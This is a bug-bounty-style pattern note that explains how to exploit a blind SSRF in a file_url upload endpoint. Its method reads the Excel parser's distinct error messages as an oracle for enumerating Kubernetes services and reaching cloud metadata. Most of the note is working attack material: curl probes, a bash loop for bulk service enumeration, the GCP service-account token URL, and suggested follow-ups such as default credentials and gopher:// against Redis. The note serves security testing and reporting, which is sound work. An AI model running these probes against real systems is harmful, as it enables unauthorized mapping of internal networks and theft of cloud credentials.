---
type: pattern
title: Pattern - Blind SSRF Error Code Differential Oracle (K8s Service Enumeration)
tags: [pattern, ssrf, blind-ssrf, kubernetes, gke, oracle, error-differential, excel-parser, openpyxl, k8s-service-enum, attack-surface-expansion, bb-pattern]
status: verified
cwe: CWE-918
severity: P3 Medium to P2 High
last_updated: 2026-06-04
---

# Pattern — Blind SSRF Error-Code Differential Oracle (K8s Service Enumeration)

> **Relationship to [[Pattern - Blind SSRF Oracle Technique]]**: the parent pattern defines a generic three-tier oracle model (HTTP✓ / AUTH / REFUSED). This pattern documents a **specific sub-variant**: using an Excel/ZIP parser (openpyxl) as the oracle gadget, exploiting three **named error codes** (rather than a generic 500) to perform **bulk enumeration** of K8s named services, plus the operational decision to prefer K8s DNS named-service lookups over raw IP scanning. The parent pattern does not cover this sub-variant's three-state classification detail, the named-service-DNS-first strategy, or the real-world scale (35+ services) observed here.

---

## Root Cause

A file-upload endpoint accepts a `file_url` parameter, and the backend fetches and attempts to parse it using a library (openpyxl in this case). The backend does **not** relay the raw HTTP response body to the frontend (blind), but it **does** surface the parse result as a distinct application-level error code. Three HTTP outcomes — connection succeeded but content isn't Excel, HTTP reachable behind an auth layer, or connection refused/timed out — each map to a different error string, forming a programmatically classifiable oracle.

---

## Three-State Oracle Classification (openpyxl example)

| Oracle state | What actually happened on the backend | Application-layer error returned |
|---|---|---|
| **HTTP✓ — non-Excel content** | TCP connection succeeded, the service returned an HTTP response, openpyxl failed to parse it | `Error reading excel file: File is not a zip file` |
| **AUTH — HTTP service exists behind an auth layer** | TCP connection succeeded, the service returned a 4xx (e.g. 401/403), openpyxl couldn't parse the auth error page | `API key validation error` |
| **UNREACHABLE — port closed or connection refused** | TCP connection failed (RST or timeout) | `Internal Server Error` / request timeout |

> **The three-state classification is the core value of this pattern**: compared to a simple reachable-vs-unreachable binary oracle, the AUTH state directly reveals that the service has an HTTP auth layer, which informs whether it's worth trying default credentials or known bypasses next.

---

## Entry-Point Identification

```
[ ] Endpoint accepts a file_url / document_url / report_url style URL parameter
[ ] Error messages suggest the backend actually fetches that URL
[ ] At least 2 distinct error variants observed (confirms the oracle is usable)
[ ] Target runs in a Kubernetes environment (pod env leaks a ClusterIP/port or DNS name)
```

---

## Technique

### Step 1 — Confirm SSRF Reachability

First trigger the endpoint against a VPS listener or public echo endpoint to confirm the backend genuinely issues an outbound HTTP request, then establish the three-state baseline:

```bash
TARGET="https://app.example.com/purchase/v1/check-enquiry-file"
API_KEY="test-api-key-12345"   # hardcoded key in this case; adjust per target

# Baseline A: external VPS / HTTP server (HTTP✓ baseline)
curl -s -X POST "$TARGET" \
  -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
  -d '{"file_url": "http://<VPS_IP>/ssrf_test"}'
# Expected: Error reading excel file: File is not a zip file

# Baseline B: RFC-1918 high port, closed (UNREACHABLE baseline)
curl -s -X POST "$TARGET" \
  -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
  -d '{"file_url": "http://10.255.255.1:9999/"}'
# Expected: Internal Server Error / timeout

# Baseline C: localhost:1 (REFUSED baseline, confirms behavior)
curl -s -X POST "$TARGET" \
  -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
  -d '{"file_url": "http://127.0.0.1:1/"}'
# Expected: Internal Server Error (connection refused)
```

If all three responses **differ**, you have a full oracle and can proceed to step 2.

### Step 2 — Obtain a K8s Service DNS List (preferred over an IP scan)

A K8s pod's environment variables automatically inject the ClusterIP and port for every service in the same namespace:

```bash
# If RCE inside a pod, or another endpoint leaks the env:
env | grep -E "_SERVICE_HOST|_SERVICE_PORT"
# Example output:
# AGENTAPP_SERVICE_HOST=10.59.17.5
# AGENTAPP_SERVICE_PORT=80
# REDIS_SERVICE_HOST=10.59.17.11
# REDIS_SERVICE_PORT=6379
# PURCHASEAPI_SERVICE_HOST=10.59.17.8
# PURCHASEAPI_SERVICE_PORT=8080
```

The env vars give you ClusterIP+port pairs directly usable as SSRF probe targets — **no need to brute-force an IP range**.

If env vars aren't available, use K8s named-service DNS (`<svc>.<namespace>.svc.cluster.local`):

```bash
# Probe a namespace (DNS FAIL vs. REFUSED distinguishes the two)
# DNS FAIL = namespace doesn't exist; REFUSED = namespace exists but service isn't in it
curl -s -X POST "$TARGET" \
  -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
  -d '{"file_url": "http://agentapp.sit.svc.cluster.local/"}'
# HTTP✓ response → namespace=sit, service=agentapp exists

curl -s -X POST "$TARGET" \
  -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
  -d '{"file_url": "http://agentapp.prod.svc.cluster.local/"}'
# UNREACHABLE / DNS FAIL → namespace=prod doesn't exist or the service isn't in it
```

### Step 3 — Bulk Oracle Scan (classify K8s named services one by one)

```bash
# Service list obtained from env vars / service registry
SERVICES=(agentapp purchaseapi reportapi authservice redis elasticsearch)
NAMESPACE="sit"  # confirmed namespace

for SVC in "${SERVICES[@]}"; do
  RESP=$(curl -s --max-time 10 -X POST "$TARGET" \
    -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
    -d "{\"file_url\": \"http://${SVC}.${NAMESPACE}.svc.cluster.local/\"}" 2>&1)

  if echo "$RESP" | grep -q "zip file"; then
    echo "[HTTP✓ ] $SVC — service exists, HTTP reachable, no auth"
  elif echo "$RESP" | grep -q "API key validation"; then
    echo "[AUTH  ] $SVC — service exists, behind an auth layer"
  else
    echo "[UNREACH] $SVC — unreachable or port closed"
  fi
done
```

### Step 4 — Build an Internal Service Map

Consolidate the classification results into a topology:

| Service | Oracle state | Next step |
|---|---|---|
| agentapp | HTTP✓ | Directly test unauth APIs, try IDOR/unauthenticated endpoints |
| authservice | AUTH | Try default credentials, header-based bypass |
| redis | UNREACHABLE (port 6379) | Check whether `gopher://` is usable |
| 169.254.169.254 | HTTP✓ | Cloud metadata reachable, try the service-account token path |

---

## Cloud Metadata Confirmation (Supplementary)

```bash
# Confirm cloud metadata endpoint reachability
curl -s -X POST "$TARGET" \
  -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
  -d '{"file_url": "http://169.254.169.254/"}'
# HTTP✓ response (File is not a zip file) = metadata service reachable

# If a custom header can be injected, try retrieving an SA token (a P1-tier condition):
# file_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Requires the Metadata-Flavor: Google header; most parsers can't inject a custom header → usually returns 403
# Only record "reachable" — do not claim a token was obtained without proof.
```

> **Anti-overclaiming principle**: cloud metadata being reachable ≠ an SA token was obtained. The report should only state what was actually proven.

---

## Real-World Scale (GKE deployment)

| Probe type | Count | Result |
|---|---|---|
| K8s named services (sit namespace) | 35+ | All classified |
| K8s node IPs (ClusterIP range scan) | 11 | TCP connection confirmed |
| Cloud metadata endpoint | 1 | HTTP✓ (File is not a zip file) |
| Redis (internal IP:6379) | 1 | UNREACHABLE (binary protocol) |

---

## Preconditions for Oracle Validity

| Condition | Must hold |
|---|---|
| Backend returns **distinct** error strings for HTTP✓ / AUTH / UNREACHABLE | Yes (all three, no exceptions) |
| Error messages are not sanitized down to a uniform generic 500 | Yes |
| The SSRF target endpoint genuinely exists (file_url is actually fetched by the backend) | Yes (confirmed in step 1) |
| The parser throws a recognizable exception on unexpected format | Yes (openpyxl's zip check) |

If any of these conditions fail, the oracle degrades to two-state or becomes unusable.

---

## Severity Tiers

| Provable fact | Severity |
|---|---|
| SSRF reaches an external URL (no oracle) | P5 Info |
| Three-state oracle confirmed (can enumerate internal state) | P3 Medium |
| 1+ internal service confirmed HTTP✓ (unauth reachable) | P2 High |
| Cloud metadata reachable (token path exists) | P2 High (S:C) |
| Cloud SA token obtained (IAM operations executable) | P1 Critical |

---

## Non-Triggers (When This Pattern Doesn't Apply)

| Scenario | Why it's excluded |
|---|---|
| All errors return a uniform `{"error": "invalid input"}` | No oracle signal — only out-of-band confirmation is possible |
| The parser swallows all exceptions and always returns 200 | No exploitable difference |
| SSRF requires auth and no hardcoded key is available | Reachability confirmation cost rises significantly, needs separate evaluation |

---

## Difference from the Parent Pattern

| Dimension | [[Pattern - Blind SSRF Oracle Technique]] (parent) | This pattern (sub-variant) |
|---|---|---|
| Oracle type | Generic three-tier (HTTP✓ / AUTH / REFUSED) | Named error codes (openpyxl exception string) |
| Service list source | Generic (env / IP scan) | Emphasizes **K8s named-service DNS over IP scanning** |
| Real-world scale | No concrete numbers | 35+ named services, 11 node IPs, cloud metadata |
| Parser gadget | Any parser | Specifically the openpyxl ZIP-check mechanism |
| AUTH state semantics | Not detailed | Explicit: `API key validation error` = an auth layer exists, worth trying default credentials |

---

## Generalization Rule

**Any backend meeting the following conditions is an oracle candidate**:
1. Accepts a user-supplied URL and fetches it server-side
2. Returns **distinct** application-level errors for HTTP-ok-but-wrong-format vs. auth-rejected vs. connection-failed

The parser type (openpyxl / LibreOffice / ffmpeg / Pillow, etc.) is a secondary detail; the core requirement is error differentiation.

---

## Related

- [[Pattern - Blind SSRF Oracle Technique]] — the generic three-state oracle model (parent pattern)
- [[Pattern - SSRF Cloud K8s Attack Chain]] — the escalation path this oracle's output feeds into (K8s API / cloud storage / Redis)
- [[Pattern - SSRF via URL-based Upload Chain]] — identifying and classifying file_url-style SSRF entry points
